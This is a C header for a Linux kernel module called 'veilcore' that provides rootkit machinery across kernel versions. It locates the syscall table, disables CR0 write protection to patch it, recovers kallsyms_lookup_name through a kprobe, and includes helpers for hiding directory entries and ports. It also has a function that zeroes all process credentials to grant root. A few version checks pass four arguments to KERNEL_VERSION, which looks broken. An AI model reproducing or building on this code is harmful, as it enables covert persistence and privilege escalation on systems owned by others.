/* SPDX-License-Identifier: GPL-2.0 */
/*
 * compat.h - kernel-version adaptation for the veilcore module:
 * symbol resolution, syscall-table location, CR0/PTE write-protection
 * toggling, file I/O and credential helpers across 2.6.x - 6.x.
 *
 * Only veilcore.c compiles against this header, so static helpers here do
 * not multiply across translation units.
 */
#ifndef VEILCORE_COMPAT_H
#define VEILCORE_COMPAT_H

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/version.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/namei.h>
#include <linux/reboot.h>
#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/seq_file.h>
#include <linux/syscalls.h>
#include <linux/sched.h>
#include <linux/kallsyms.h>
#include <net/tcp.h>
#include <net/udp.h>
#include <linux/inet.h>
#include <linux/dirent.h>

/* for_each_process moved to its own header in 4.11; relying on sched.h to
 * pull it in implicitly is unreliable there. */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 11, 0)
#include <linux/sched/signal.h>
#endif

/* uaccess location changed in 4.13. */
#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
#include <asm/uaccess.h>
#else
#include <linux/uaccess.h>
#endif

/* PROC_ROOT_INO lives in proc_ns.h since 3.10. */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
#include <linux/proc_ns.h>
#else
#include <linux/proc_fs.h>
#endif

/* fd table accessor moved in 2.6.26. */
#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 26, 0)
#include <linux/file.h>
#else
#include <linux/fdtable.h>
#endif

#if LINUX_VERSION_CODE <= KERNEL_VERSION(2, 6, 18, 0)
#include <linux/unistd.h>
#endif

/* Everything below writes the syscall table pages directly. */
#include <linux/mm.h>
#include <asm/pgtable.h>

/* ------------------------------------------------------------------ */
/* Syscall numbers - only when the headers do not define them.        */
/* ------------------------------------------------------------------ */
#ifndef __NR_getdents
#ifdef CONFIG_X86_32
#define __NR_getdents 141
#else
#define __NR_getdents 78
#endif
#endif

#ifndef __NR_getdents64
#ifdef CONFIG_X86_32
#define __NR_getdents64 220
#else
#define __NR_getdents64 217
#endif
#endif

#ifndef __NR_reboot
#ifdef CONFIG_X86_32
#define __NR_reboot 88
#else
#define __NR_reboot 169
#endif
#endif

/* ------------------------------------------------------------------ */
/* PTREGS syscall convention (x86_64 only: i386 keeps the classic     */
/* asmlinkage ABI on every kernel version).                           */
/* ------------------------------------------------------------------ */
#if defined(CONFIG_X86_64) && LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
#define PTREGS_SYSCALL 1
#endif

/* Never hard-code di/si: 32-bit pt_regs carries the first arguments in
 * bx/cx instead. */
#ifdef CONFIG_X86_64
#define SYSCALL_ARG1(r) ((r)->di)
#define SYSCALL_ARG2(r) ((r)->si)
#else
#define SYSCALL_ARG1(r) ((r)->bx)
#define SYSCALL_ARG2(r) ((r)->cx)
#endif

/* Minimal IS_ENABLED stand-in for kernels predating linux/kconfig.h.
 * Valid for options that are undefined or defined to 1 - the only form
 * this module queries. */
#ifndef IS_ENABLED
#define __VEIL_IS_EN_1 1
#define __VEIL_IS_EN_0 0
#define IS_ENABLED(option) __VEIL_IS_EN_##option
#endif

/* ------------------------------------------------------------------ */
/* struct file / struct inet_sock field accessors.                    */
/* ------------------------------------------------------------------ */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 19, 0)
#define FILE_INODE(f) ((f)->f_path.dentry->d_inode)
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(3, 9, 0)
#define FILE_INODE(f) ((f)->f_inode)
#else
#define FILE_INODE(f) ((f)->f_dentry->d_inode)
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 33)
#define INET_SPORT(sk) ((sk)->inet_sport)
#define INET_DPORT(sk) ((sk)->inet_dport)
#else
#define INET_SPORT(sk) ((sk)->sport)
#define INET_DPORT(sk) ((sk)->dport)
#endif

/*
 * GET_INODE(fd): inode behind an open fd for the /proc getdents test.
 * NOT the same as FILE_INODE(file) (that one starts from struct file *).
 * Every hop is NULL-checked: a bad fd degrades to "ordinary directory".
 */
static inline struct inode *GET_INODE(unsigned int fd)
{
	struct files_struct *files;
	struct fdtable *fdt;
	struct file *file;

	files = current->files;
	if (!files)
		return NULL;
	fdt = files_fdtable(files);
	if (!fdt || !fdt->fd || fd >= fdt->max_fds)
		return NULL;
	file = fdt->fd[fd];
	if (!file)
		return NULL;
	return FILE_INODE(file);
}

/* ------------------------------------------------------------------ */
/* linux_dirent: older kernels only ship the 64-bit variant, so the   */
/* classic layout is always defined locally (no conflict: linux/      */
/* dirent.h has only linux_dirent64 there).                           */
/* ------------------------------------------------------------------ */
struct linux_dirent {
	unsigned long  d_ino;
	unsigned long  d_off;
	unsigned short d_reclen;
	char           d_name[1];
};

/* ------------------------------------------------------------------ */
/* CR0 access. Above 4.16 the kernel's write_cr0() refuses to clear   */
/* WP, so writes go through inline assembly anchored on __force_order */
/* (same trick the kernel itself uses).                               */
/* ------------------------------------------------------------------ */
static unsigned long __force_order;

static inline unsigned long veil_read_cr0(void)
{
	unsigned long val;

	asm volatile("mov %%cr0, %0" : "=r"(val), "=m"(__force_order) : : "memory");
	return val;
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
static inline void veil_write_cr0(unsigned long val)
{
	asm volatile("mov %0, %%cr0" : : "r"(val), "m"(__force_order) : "memory");
}
#else
static inline void veil_write_cr0(unsigned long val)
{
	write_cr0(val);
}
#endif

/* ------------------------------------------------------------------ */
/* Symbol resolution. Before 5.7 kallsyms_lookup_name was exported;   */
/* from 5.7 a kprobe registered on the symbol itself is the standard  */
/* bootstrap. register_kprobe's return value MUST be checked before   */
/* kp.addr is ever dereferenced.                                      */
/* ------------------------------------------------------------------ */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>

static unsigned long (*veil_kallsyms_lookup_name)(const char *name);

static int veil_init_kallsyms(void)
{
	/* Designated initializers are field-order independent, so tail
	 * additions to struct kprobe cannot break this. */
	struct kprobe kp = { .symbol_name = "kallsyms_lookup_name", .addr = NULL };
	int ret;

	ret = register_kprobe(&kp);
	if (ret < 0)
		return ret;
	veil_kallsyms_lookup_name = (unsigned long (*)(const char *))kp.addr;
	unregister_kprobe(&kp);
	return veil_kallsyms_lookup_name ? 0 : -ENOENT;
}

static unsigned long resolve_sym(const char *name)
{
	if (!veil_kallsyms_lookup_name)
		return 0;
	return veil_kallsyms_lookup_name(name);
}
#else
static int veil_init_kallsyms(void)
{
	return 0;		/* kallsyms_lookup_name is directly callable */
}

static unsigned long resolve_sym(const char *name)
{
	return kallsyms_lookup_name(name);
}
#endif

/* ------------------------------------------------------------------ */
/* Syscall table location. Above 4.4 kallsyms carries it; older       */
/* kernels scan upward from sys_close until the slot matches.         */
/* ------------------------------------------------------------------ */
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)

static unsigned long *get_syscall_table(void)
{
	unsigned long *table = (unsigned long *)resolve_sym("sys_call_table");

	return table;
}

#else

extern asmlinkage long sys_close(unsigned int fd);	/* linker symbol, not kallsyms */

static unsigned long *get_syscall_table(void)
{
	unsigned long i;
	unsigned long *table;
	const unsigned long scan_limit = (unsigned long)sys_close + (1UL << 24);

	/* Forward scan only, hard 16 MB cap: never walk toward lower
	 * addresses and never loop toward ULONG_MAX. */
	for (i = (unsigned long)sys_close; i < scan_limit; i += sizeof(void *)) {
		table = (unsigned long *)i;
		if (table[__NR_close] == (unsigned long)sys_close)
			return table;
	}
	return NULL;
}
#endif

/* ------------------------------------------------------------------ */
/* kernel_read / kernel_write argument order flipped in 4.14 and      */
/* set_fs() disappeared in 5.10 (the classic branches below are only  */
/* reached on kernels that still have it).                            */
/* ------------------------------------------------------------------ */
static inline ssize_t veil_kernel_read(struct file *file, void *buf,
				       size_t count, loff_t *pos)
{
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 14, 0)
	return kernel_read(file, buf, count, pos);
#else
	mm_segment_t old_fs = get_fs();
	ssize_t ret;

	set_fs(KERNEL_DS);
	ret = kernel_read(file, pos, buf, count);
	if (ret >= 0)
		*pos += ret;
	set_fs(old_fs);
	return ret;
#endif
}

static inline ssize_t veil_kernel_write(struct file *file, const void *buf,
					size_t count, loff_t *pos)
{
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 14, 0)
	return kernel_write(file, buf, count, pos);
#else
	mm_segment_t old_fs = get_fs();
	ssize_t ret;

	set_fs(KERNEL_DS);
	ret = kernel_write(file, buf, count, *pos);
	if (ret >= 0)
		*pos += ret;
	set_fs(old_fs);
	return ret;
#endif
}

/* ------------------------------------------------------------------ */
/* Credential helpers.                                                */
/* ------------------------------------------------------------------ */
#if (LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) && defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS)) || \
	LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
#define VEIL_KUID_TYPE_CHECKS 1
#endif

static inline void veil_set_cred_zero(struct cred *creds)
{
#ifdef VEIL_KUID_TYPE_CHECKS
	creds->uid.val = 0;
	creds->gid.val = 0;
	creds->euid.val = 0;
	creds->egid.val = 0;
	creds->suid.val = 0;
	creds->sgid.val = 0;
	creds->fsuid.val = 0;
	creds->fsgid.val = 0;
#else
	creds->uid = 0;
	creds->gid = 0;
	creds->euid = 0;
	creds->egid = 0;
	creds->suid = 0;
	creds->sgid = 0;
	creds->fsuid = 0;
	creds->fsgid = 0;
#endif
}

#endif /* VEILCORE_COMPAT_H */
